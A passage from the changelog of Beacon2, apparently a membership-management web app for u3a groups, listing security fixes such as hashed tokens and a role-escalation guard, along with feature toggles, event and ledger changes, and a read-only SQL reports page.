  wired up. Existing dev/test behaviour is unchanged.
- **Portal registration forename match tightened** —
  `routes/public.js` `/portal/register` no longer accepts a prefix match
  for `forename`. Submitting `"J"` previously matched every member whose
  forename began with "J"; now the full forename or the first whitespace-
  delimited token must match exactly (case-insensitive).
- **`portal_verification_token` now hashed at rest** — same SHA-256
  treatment as `portal_reset_token` and `payment_token`. Covers both the
  registration flow and the email-change re-verification path in
  `routes/portal.js`. In-flight verification links become invalid on
  deploy.
- **Role-assignment privilege-escalation guard** — `POST /users`,
  `POST /users/:id/roles`, and `DELETE /users/:id/roles/:roleId` now refuse to
  grant or revoke a role whose privilege set includes anything the actor does
  not themselves hold. Previously, anyone with `user_record:change` could
  grant Administration to any user (including themselves).
- **Hashed opaque tokens at rest** — `portal_reset_token` and `payment_token`
  are now stored as SHA-256 hashes (via the new `hashOpaqueToken()` helper in
  `utils/password.js`). A database leak no longer leaks usable password-reset
  or in-flight payment-continuation tokens. Plaintext tokens are still
  delivered to the user via the email link / API response. The portal renewal
  metadata suffix (`hash|<base64-meta>`) is preserved unchanged.
- **Note:** any portal password-reset link issued before deployment, and any
  in-flight "Applicant" payment-resume link, will stop working at deploy
  time — affected users should request a fresh link or restart the joining
  flow.

## [Unreleased] — 2026-06-09

### Added
- **Automated security review workflow** — `.github/workflows/security-review.yml`
  runs `anthropics/claude-code-security-review` on every PR targeting `main`,
  posting findings as inline PR comments. Requires the `ANTHROPIC_API_KEY`
  repository secret.

## [Unreleased] — 2026-04-28

### Added
- **`analyse-u3a-artifacts/`** — a self-contained primer kit destined for a
  separate, local-only **Analyse u3a** repo (a new desktop analysis app that
  consumes the same Beacon backup `.xlsx` format Beacon2 imports). Folder is
  not used by Beacon2 at runtime; it exists here so it can be reviewed and
  copied wholesale into the new repo.
  - `BEACON-DATA-STRUCTURE.md` (top-level reference, Mermaid ER diagram) plus
    four per-module references (`MEMBERS`, `GROUPS`, `FINANCE`, `CONTACTS`)
  - `schemas/json/` — JSON Schema (Draft 2020-12) per sheet
  - `schemas/zod/` — Zod schemas + inferred TS types per sheet, with
    `_coerce.ts` shared helpers and an `index.ts` exporting `SHEET_SCHEMAS`,
    `parseSheet`, and a `BeaconBackup` aggregate type
  - `CLAUDE.md` — primer for the AI agent that will work on the new repo
  - `README.md` — explains how to copy the kit into the new repo

---

## [0.10.8] — 2026-04-21

### Added
- **Four new feature toggles** in Feature Configuration:
  - **Letters** — split out from the Email master so u3as without SendGrid can
    still compose and print PDF letters.
  - **SQL Reports** — gates the `/reports` module. Some u3as may prefer to hide
    the ad-hoc query tool.
  - **Member Photos** — gates photo upload/view on member records and the
    members portal. u3as that don't want to store member photos (GDPR-minded)
    can turn this off.
  - **Public Pages** — gates the public Groups and Calendar pages. u3as that
    publish only via their own website can disable these routes.
- **Backend enforcement for every feature toggle** — `requireFeature()`
  middleware (or `isFeatureEnabled()` for pre-auth public routes) now guards
  every route that belongs to a toggled feature. Previously most toggles were
  nav-only; turning one off now returns 403 at the API as well.

### Changed
- **Dropped three low-value toggles** (`statistics`, `addressesExport`,
  `calendar`): these are all universally useful and only added noise to the
  configuration page. Addresses export and statistics are now always visible;
  the calendar is controlled by the `events` master toggle.
- **Final toggle count: 25** (was 24). `Beacon2 Project Definition.md` already
  quoted 25 and is now accurate.
- **Group Cash / Team Cash tabs clarified** — added a short description under the
  heading explaining that these entries are the group's/team's own cash record,
  not linked to the u3a's central accounts, and that the Finance Ledger shows
  different, complementary transactions. The shortcut button previously labelled
  *"View in Finance Ledger"* is renamed to **"Central Ledger"** with a tooltip
  explaining that it opens this group's/team's *other* transactions in the
  central ledger.

---

## [0.10.7] — 2026-04-21

### Added
- **"View in Finance Ledger" button on event Financials tab** — users with
  `finance_transactions:view` permission see a small button that jumps directly
  to the Finance Ledger pre-filtered to that event's transactions.
- **"View in Finance Ledger" button on group/team Group Cash tab** — the same
  button appears on the Group Cash (group ledger) tab, pre-filtering the Finance
  Ledger to that group or team. This makes clear the distinction between the
  group's internal cash book and the organisation's main finance transactions.
- **Show/hide toggle on all password fields** — every password input now has an
  eye-icon button that temporarily reveals the typed characters. Covered screens:
  System Login, Portal Login, Portal Register, Portal Reset Password, Portal
  Personal Details, Personal Preferences, and System Dashboard (create tenant).
  Implemented via a shared `PasswordInput` component
  (`frontend/src/components/PasswordInput.jsx`).

### Changed
- **Event Record is now the single editor for one event** — previously, editing
  the basic fields of a group/team event happened inline on the Group/Team
  **Events** tab, while attendance and finance transactions lived separately on
  `/calendar/events/:id`. The Event Record's **Details** tab is now editable
  (Edit / Save / Cancel / Delete), routing the PATCH/DELETE to the correct
  backend endpoint based on the event's context (group, team, or open meeting).
  Clicking an event's date in the Group/Team Events tab or Calendar list now
  drills into the Event Record for full editing. Inline-edit forms on the
  Schedule tab and the Calendar page's "Other" filter are removed. Adding events
  (with recurrence) and bulk delete remain where they were.
- **Calendar filter "Other" renamed to "Open Meetings and Other"** — clearer
  label for the non-group-event management mode.
- **Standalone `/calendar/open-meetings` page retired** — all open-meeting
  management happens on the Events page via the **Open Meetings and Other**
  filter. Legacy URLs redirect to `/calendar?filter=other`. The Open Meetings
  nav link has been removed from the Events page NavBar.

### Fixed
- **"View in Finance Ledger" from an event now pre-filters to that event** —
  arriving at `/finance/ledger?view=event&eventId=…` was landing on an empty
  ledger because the reset-on-view-change effect was firing on initial mount and
  clearing the event ID read from the URL. The reset effect now skips the first
  run so a URL-seeded `eventId` (or `groupId`) survives.
- **Restore from Beacon now imports Open Meetings** — the legacy Beacon backup's
  `Calendar` sheet was previously ignored entirely, so any Open Meetings (Calendar
  rows with no `gkey`) were silently dropped, and the seeded "Open Meetings"
  event type — wiped by `clearTenantData` — was not re-created. `restoreBeacon()`
  now re-creates the default "Open Meetings" event type and inserts each non-group
  Calendar row as a `group_events` record (`group_id NULL`) linked to that event
  type, with date/time, end time, venue, topic, details, contact and
  exclude-from-public-calendar all preserved.

---

## [0.10.6] — 2026-04-20

### Changed
- **Finance menu simplified** — the three Ledger entries (*by account / by category
  / by group*) in the main menu have been consolidated into a single **Ledger**
  link. View selection (Account / Category / Group / Event) now happens inside
  the Ledger page using the existing in-page toggle.
- **Calendar menu entry renamed to Events** — better reflects the page's broader
  scope (group meetings + non-group events + new tabular view). The route
  `/calendar` is unchanged to preserve bookmarks and portal links.
- **Event Record page nav bar updated** — the top nav link now reads
  "Home – Events – {Group}" (previously "Calendar – {Group}"), matching the
  pattern used on Group and Team records.
- **Event Record page clearly labelled as an Event** — a small uppercase
  "EVENT" eyebrow label now appears above the title so the page can no longer
  be mistaken for a Group or Team record, which share a similar layout.

### Added
- **Ledger "by Event" view** (`frontend/src/pages/finance/FinanceLedger.jsx`) —
  new fourth view tab. Pick an event via search-as-you-type (topic / group name /
  date). Shows every transaction linked to that event, regardless of year; the
  year selector is hidden in this view. Backend already supported `?eventId=…`
  on `GET /finance/transactions`.
- **Events page — Calendar vs Table view toggle**
  (`frontend/src/pages/calendar/Calendar.jsx`). Table mode offers sortable
  columns (Date, Start, End, Group/Type, Topic, Venue, Postcode, Enquiries,
  Details). Calendar mode preserves the existing chronological list with a
  *Show Detail* toggle.
- **Show past events** toggle on the Events page — one-click expansion of the
  date-range `from` back 12 months for attendance / financial review.
- **Excel download of filtered events** — new
  `GET /calendar/events/excel` route (requires `calendar:download`), plus a
  Download Excel button alongside Download PDF on the Events page.
- **Upcoming events widget on Home** — collapsible panel above the menu showing
  the next five events in the coming 90 days. Expand/collapse state persisted
  via a new `upcomingEventsExpanded` preference key (collapsed by default).

### Fixed
- **Event Record timestamp now displays** — the "Event record created … ; last
  changed …" footer on the Event Record page was silently hidden because
  `RecordTimestamp` was being passed `created`/`updated` props instead of
  `createdAt`/`updatedAt`, and no `label` prop. The footer now renders beneath
  the tab content on every tab, mirroring the Group Record footer.
- **`splitSQL()` hardened to ignore semicolons in comments and strings** —
  the SQL splitter in `backend/src/utils/migrate.js` previously only tracked
  `$$` dollar quoting, which is why a stray `;` in a `--` line comment in
  `tenant_schema.sql` was able to break tenant migrations. It now also skips
  `-- line comments`, `/* block comments */` (including multi-line), and
  `'single-quoted strings'` (with `''` as the escape). Ten new tests in
  `backend/src/__tests__/splitSQL.test.js` pin the behaviour, including a
  regression test for the exact `saved_reports` comment pattern that caused
  the original Render failure
- **`saved_reports` tenant migration broken by stray semicolon in comment** —
  the "Saved reports" comment in `backend/prisma/tenant_schema.sql` contained
  `SQL is SELECT/WITH only; parameters …`, and `splitSQL()` in
  `backend/src/utils/migrate.js` splits raw SQL on `;` without stripping line
  comments. That produced a bogus statement starting with `parameters` —
  Postgres returned `syntax error at or near "parameters"` during tenant
  migration on Render, and the follow-up `CREATE UNIQUE INDEX` failed with
  `relation "saved_reports" does not exist` because the `CREATE TABLE` had
  never run. Reworded the comment (see the `CLAUDE-REFERENCE.md` §1 rule:
  no semicolons in SQL comments)

### Added
- **Standard Beacon Implementation preset on legacy restore** — introduced a
  `STANDARD_IMPLEMENTATIONS` concept in `shared/constants.js`: a named,
  described preset for the full `feature_config` JSON. Each entry has a
  `name`, `description`, and a `features` map covering every key in the new
  `ALL_FEATURE_KEYS` inventory. The first (and only) entry, "Beacon Migration
  Default", turns every feature ON except **SiteWorks Integration** and
  **Custom Fields**. `restoreBeacon()` in `backend/src/routes/backup.js` now
  applies this preset as its final `tenant_settings` write, so a u3a
  migrating from Beacon lands with the recommended feature set (including
  Gift Aid and Group Ledger, which previously defaulted OFF). Beacon2-format
  restores are unchanged — they continue to carry their own `feature_config`

### Fixed
- **`eventAttendance` accepted by sys-admin feature-config PATCH** — the
  hardcoded `VALID_FEATURE_KEYS` list in `backend/src/routes/system.js` was
  missing `eventAttendance` (present in the per-user PATCH list in
  `backend/src/routes/settings.js` and in the UI). Both routes now import
  the single `ALL_FEATURE_KEYS` constant from `shared/constants.js`, so a
  sys admin can toggle Event Attendance for any tenant and the two lists
  cannot drift again

## [0.10.5] — 2026-04-18

### Added
- **SQL reports** — new `/reports` page for running saved parameterised SELECT/WITH
  queries against the tenant schema. Library of saved reports (site admin creates +
  edits; anyone with `reports:run` can execute) plus an ad-hoc SQL editor gated to
  site administrators. Safety: queries run in a read-only transaction with
  `SET LOCAL transaction_read_only = on`, `SET LOCAL statement_timeout = 15000`, a
  single-statement guard that rejects anything starting with anything other than
  `SELECT`/`WITH`, and a 5,000-row result cap. Named `:param` placeholders are
  substituted with positional `$N` parameters server-side so parameter values can
  never alter the query structure. Results render as a table with row count +
  duration metadata; Excel download via ExcelJS. Every run is written to the audit
  log. New `reports` privilege resource with `view` + `run` actions; added to
  Administration role by default. Home page menu gains a "SQL reports" link under
  Misc

---

## Older releases

Entries for **0.9.7 (2026-04-18) and earlier** have been moved to
[`docs/history/CHANGELOG-archive.md`](docs/history/CHANGELOG-archive.md)
to keep this file navigable.
